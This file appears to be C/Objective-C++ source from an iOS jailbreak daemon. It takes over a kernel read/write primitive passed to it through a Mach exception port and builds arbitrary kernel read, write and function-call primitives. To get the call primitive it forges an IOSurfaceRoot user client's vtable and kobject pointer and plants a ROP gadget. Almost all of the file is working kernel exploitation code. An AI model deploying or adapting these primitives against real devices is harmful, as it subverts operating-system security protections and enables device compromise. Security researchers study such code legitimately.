#include "krw.h"
#include "../boot_info.h"
#include "./common/KernelRW.hpp"
#include "./common/macros.h"
#include "ipc.h"
#include "offsets.h"
#include <Foundation/Foundation.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static KernelRW *krw = NULL;

uint64_t _kbase = 0;
uint64_t _kern_proc = 0;
uint64_t _all_proc = 0;

uint64_t _fake_vtable = 0;
uint64_t _fake_client = 0;
mach_port_t _user_client = 0;

int get_kernel_rw(void) {
  NSLog(@"[jailbreakd] Waiting for receiving kernel r/w handoff\n");
  mach_port_t fakethread = 0;
  mach_port_t transmissionPort = 0;
  // cleanup([&] {
  //   if (transmissionPort) {
  //     mach_port_destroy(mach_task_self(), transmissionPort);
  //     transmissionPort = MACH_PORT_NULL;
  //   }
  //   if (fakethread) {
  //     thread_terminate(fakethread);
  //     mach_port_destroy(mach_task_self(), fakethread);
  //     fakethread = MACH_PORT_NULL;
  //   }
  // });
  kern_return_t kr = 0;

  retassure(!(kr = thread_create(mach_task_self(), &fakethread)),
            "[jailbreakd] Failed to create fake thread");

  // set known state
  retassure(!(kr = thread_set_exception_ports(fakethread, EXC_BREAKPOINT,
                                              MACH_PORT_NULL, EXCEPTION_DEFAULT,
                                              ARM_THREAD_STATE64)),
            "[jailbreakd] Failed to set exception port to MACH_PORT_NULL");

  // set magic state
  {
    arm_thread_state64_t state = {};
    mach_msg_type_number_t statecnt = ARM_THREAD_STATE64_COUNT;
    memset(&state, 0x41, sizeof(state));
    retassure(!(kr = thread_set_state(fakethread, ARM_THREAD_STATE64,
                                      (thread_state_t)&state,
                                      ARM_THREAD_STATE64_COUNT)),
              "[jailbreakd] Failed to set fake thread state");
  }

  // get transmission port
  {
    exception_mask_t masks[EXC_TYPES_COUNT] = {};
    mach_msg_type_number_t masksCnt = 0;
    mach_port_t eports[EXC_TYPES_COUNT] = {};
    exception_behavior_t behaviors[EXC_TYPES_COUNT] = {};
    thread_state_flavor_t flavors[EXC_TYPES_COUNT] = {};
    do {
      retassure(!(kr = thread_get_exception_ports(fakethread, EXC_BREAKPOINT,
                                                  masks, &masksCnt, eports,
                                                  behaviors, flavors)),
                "[jailbreakd] Failed to get thread exception port");
      transmissionPort = eports[0];
    } while (transmissionPort == MACH_PORT_NULL);
  }

  krw = new KernelRW();
  krw->handoffPrimitivePatching(transmissionPort);

  krw->getOffsets(&_kbase, &_kern_proc, &_all_proc);
  NSLog(@"[jailbreakd] Received Kernel R/W handoff!\n");
  return 0;
}

uint64_t get_kbase(void) { return _kbase; }

uint64_t get_kslide(void) { return _kbase - 0xfffffff007004000; }

uint64_t get_kernproc(void) { return _kern_proc; }

uint64_t get_allproc(void) { return _all_proc; }

uint32_t kread32(uint64_t where) {
  if (krw)
    return krw->kread32(where);
  return 0;
}
uint64_t kread64(uint64_t where) {
  if (krw)
    return krw->kread64(where);
  return 0;
}

void kwrite32(uint64_t where, uint32_t what) {
  if (krw) {
    krw->kwrite32(where, what);
  }
}
void kwrite64(uint64_t where, uint64_t what) {
  if (krw) {
    krw->kwrite64(where, what);
  }
}

size_t kreadbuf(uint64_t kaddr, void *output, size_t size) {
  if (krw) {
    return krw->kreadbuf(kaddr, output, size);
  }
  return 0;
}

size_t kwritebuf(uint64_t kaddr, const void *input, size_t size) {
  if (krw) {
    return krw->kwritebuf(kaddr, input, size);
  }
  return 0;
}

void kwrite8(uint64_t where, uint8_t what) {
  if (krw) {
    kwritebuf(where, &what, sizeof(uint8_t));
  }
}

void kwrite16(uint64_t where, uint16_t what) {
  if (krw) {
    kwritebuf(where, &what, sizeof(uint16_t));
  }
}

uint8_t kread8(uint64_t where) {
  uint8_t out = 0;
  if (krw) {
    kreadbuf(where, &out, sizeof(uint8_t));
  }
  return out;
}

uint16_t kread16(uint64_t where) {
  uint16_t out = 0;
  if (krw) {
    kreadbuf(where, &out, sizeof(uint16_t));
  }
  return out;
}

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
  // se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;
  // XXX guess what is that address xD
  uint64_t kmem = off_zm_fix_addr_kalloc + get_kslide();
  uint64_t zm_alloc = kread64(kmem); // idk?
  uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

  return (zm_stripped | ((addr)&0xffffffff));
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2,
               uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
  uint64_t offx20 = kread64(_fake_client + 0x40);
  uint64_t offx28 = kread64(_fake_client + 0x48);
  kwrite64(_fake_client + 0x40, x0);
  kwrite64(_fake_client + 0x48, addr);
  uint64_t returnval = IOConnectTrap6(
      _user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3),
      (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
  kwrite64(_fake_client + 0x40, offx20);
  kwrite64(_fake_client + 0x48, offx28);
  return returnval;
}

uint64_t kalloc(size_t ksize) {
  init_kcall();
  uint64_t allocated_kmem =
      kcall(bootInfo_getUInt64(@"off_kalloc_data_external") + get_kslide(),
            ksize, 1, 0, 0, 0, 0, 0);
  allocated_kmem = zm_fix_addr_kalloc(allocated_kmem);
  term_kcall();
  return allocated_kmem;
}

void kfree(uint64_t kaddr, size_t ksize) {
  init_kcall();
  kcall(bootInfo_getUInt64(@"off_kfree_data_external") + get_kslide(), kaddr,
        ksize, 0, 0, 0, 0, 0);
  term_kcall();
}

int init_kcall(void) {
  _fake_vtable = bootInfo_getUInt64(@"kcall_fake_vtable_allocations");
  _fake_client = bootInfo_getUInt64(@"kcall_fake_client_allocations");

  uint64_t add_x0_x0_0x40_ret_func =
      bootInfo_getUInt64(@"off_add_x0_x0_0x40_ret") + get_kslide();

  io_service_t service = IOServiceGetMatchingService(
      kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
  if (service == IO_OBJECT_NULL) {
    printf(" [-] unable to find service\n");
    exit(EXIT_FAILURE);
  }
  _user_client = 0;
  kern_return_t err =
      IOServiceOpen(service, mach_task_self(), 0, &_user_client);
  if (err != KERN_SUCCESS) {
    printf(" [-] unable to get user client connection\n");
    exit(EXIT_FAILURE);
  }
  IOObjectRelease(service);
  uint64_t uc_port = port_name_to_ipc_port(_user_client);
  uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);
  uint64_t uc_vtab = kread64(uc_addr);

  for (int i = 0; i < 0x200; i++) {
    kwrite64(_fake_vtable + i * 8, kread64(uc_vtab + i * 8));
  }

  for (int i = 0; i < 0x200; i++) {
    kwrite64(_fake_client + i * 8, kread64(uc_addr + i * 8));
  }
  kwrite64(_fake_client, _fake_vtable);
  kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
  kwrite64(_fake_vtable + 8 * 0xB8, add_x0_x0_0x40_ret_func);

  return 0;
}

int term_kcall(void) {
  IOServiceClose(_user_client);
  _user_client = 0;

  return 0;
}
